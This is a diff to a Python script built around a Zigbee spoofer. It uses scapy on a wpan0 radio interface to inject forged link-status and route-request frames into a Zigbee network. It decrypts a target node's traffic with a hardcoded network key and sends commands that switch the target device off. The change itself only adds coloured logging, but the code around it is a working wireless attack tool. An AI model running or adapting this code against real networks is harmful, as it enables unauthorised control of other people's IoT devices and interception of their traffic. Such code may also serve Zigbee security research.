@@ -7,8 +7,14 @@ from scapy.layers.zigbee import ZigBeeBeacon, ZigbeeNWK, ZigbeeSecurityHeader, Z
 from util.crypto import CryptoUtils
 from zigbee_frames.frameprovider import FrameProvider
 from threading import Thread
+import logging
+from colorama import Fore
 import time
 
+# Set up console logger
+logging.basicConfig(level=logging.INFO, format=Fore.RESET+'%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+
+# set up the database
 database = {
     "network_key" : bytes.fromhex("31701f12dd93150ec4efce97e381ef06"),
     "extended_source_addr" : bytes.fromhex("00:12:4b:00:1c:dd:27:3d".replace(":", "")),
@@ -25,8 +31,13 @@ class ZigbeeSpoofer:
         
     def spoofing_loop(self):
         while True:
-            sendp(self.frame_provider.link_status(database["pan_id"]), iface="wpan0")
-            sendp(self.frame_provider.many_to_one_route_request(0xfffd, database["pan_id"]), iface="wpan0")
+            logging.debug("Sending link status and route request")
+            link_status_frame = self.frame_provider.link_status(database["pan_id"])
+            logging.debug(f"{Fore.BLUE}---> Packet: {link_status_frame.summary()}")
+            sendp(link_status_frame, iface="wpan0", verbose=0)
+            route_request_frame = self.frame_provider.many_to_one_route_request(0xfffd, database["pan_id"])
+            logging.debug(f"{Fore.BLUE}---> Packet: {route_request_frame.summary()}")
+            sendp(route_request_frame, iface="wpan0", verbose=0)
             time.sleep(5)
 
 if __name__ == '__main__':
@@ -44,21 +55,24 @@ if __name__ == '__main__':
     
     def response_proc(packet: Packet, transaction_sequence: int) -> bool:
         if packet is not None and packet.src_addr == database["target_node"]:
-            print(f"Packet: {packet.summary()}")
+            logging.info(f"{Fore.GREEN}<--- Packet: {packet.summary()}")
             if packet.haslayer(ZigbeeNWK) and packet.flags & 16:   
-                print(f"extended source found: {packet.ext_src:016x}")
+                logging.debug(f"{Fore.YELLOW}extended source found: {packet.ext_src:016x}")
                 if packet.src_addr not in database["nodes"]:
+                    logging.debug(f"{Fore.YELLOW}adding node to database")
                     database["nodes"][packet.src_addr] = packet.ext_src.to_bytes(8, 'big')
-            if packet.haslayer(ZigbeeNWK) and packet.flags & 2 and database["nodes"][packet.src_addr] is not None:
-                print(f"network key: {database['network_key'].hex()}")
+            if packet.haslayer(ZigbeeNWK) and packet.flags & 2 and packet.src_addr in database["nodes"]:
+                logging.debug(f"network key: {database['network_key'].hex()}")
                 decrypted_payload, success = CryptoUtils.zigbee_packet_decrypt(database['network_key'], packet, database["nodes"][packet.src_addr])
                 if success:
                     if decrypted_payload.haslayer(ZigbeeClusterLibrary) and decrypted_payload.transaction_sequence == transaction_sequence:
-                        decrypted_payload.show()
+                        logging.info(f"{Fore.YELLOW}decoded frame {decrypted_payload.summary()}")
                         return True
 
     while True:
         read_attributes_frame, transaction_sequence = fp.zcl_read_attributes(0x0, database["pan_id"], database["target_node"])
+        logging.info(f"{Fore.BLUE}---> Packet: {read_attributes_frame.summary()}")
         Transceiver.send_and_receive(read_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)
         write_attributes_frame, transaction_sequence = fp.zcl_on_off(0x0, database["pan_id"], database["target_node"], False)
+        logging.info(f"{Fore.BLUE}---> Packet: {write_attributes_frame.summary()}")
         Transceiver.send_and_receive(write_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)
